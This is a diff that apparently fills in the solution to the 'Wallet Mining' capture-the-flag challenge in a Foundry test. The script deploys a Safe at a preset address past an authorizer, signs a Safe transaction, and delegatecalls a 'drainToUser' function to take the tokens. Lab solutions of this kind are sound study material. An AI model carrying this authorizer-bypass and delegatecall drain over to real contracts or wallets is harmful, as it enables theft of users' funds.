@@ -24,6 +24,7 @@ import {
     SAFE_SINGLETON_FACTORY_ADDRESS,
     SAFE_SINGLETON_FACTORY_CODE
 } from "./SafeSingletonFactory.sol";
+import {msg_data_helper ,exploiter} from "./Wallet_mining_exploiter.sol";
 
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -156,9 +157,69 @@ contract WalletMiningChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_walletMining() public checkSolvedByPlayer {
-        
-    }
+   function test_walletMining() public checkSolvedByPlayer {
+    exploiter exploit = new exploiter(address(token));
+
+    // Allow exploit contract to act as user
+    vm.signAndAttachDelegation(address(exploit), userPrivateKey);
+
+    // Step 1: Deploy Safe at target + bypass authorizer
+    exploiter(user).deployWalletAndAuthorize(
+        address(walletDeployer),
+        user,
+        address(authorizer)
+    );
+
+    // Step 2: Prepare delegatecall payload
+    bytes memory drainCall = abi.encodeWithSignature(
+        "drainToUser(address)",
+        address(token)
+    );
+
+    Safe safe = Safe(payable(USER_DEPOSIT_ADDRESS));
+    uint256 nonce = safe.nonce();
+
+    // Step 3: Build Safe tx hash
+    bytes32 structHash = keccak256(
+        abi.encode(
+            keccak256(
+                "SafeTx(address to,uint256 value,bytes data,uint8 operation,uint256 safeTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)"
+            ),
+            address(exploit),
+            0,
+            keccak256(drainCall),
+            uint8(Enum.Operation.DelegateCall),
+            0,
+            0,
+            0,
+            address(0),
+            address(0),
+            nonce
+        )
+    );
+
+    bytes32 digest = keccak256(
+        abi.encodePacked(
+            "\x19\x01",
+            safe.domainSeparator(),
+            structHash
+        )
+    );
+
+    // Step 4: Sign with user key
+    (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, digest);
+    bytes memory signature = abi.encodePacked(r, s, v);
+
+    // Step 5: Execute via delegated user
+    exploiter(user).executeSafeTx(
+        address(exploit),
+        drainCall,
+        signature,
+        ward,
+        address(token)
+    );
+}
+
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
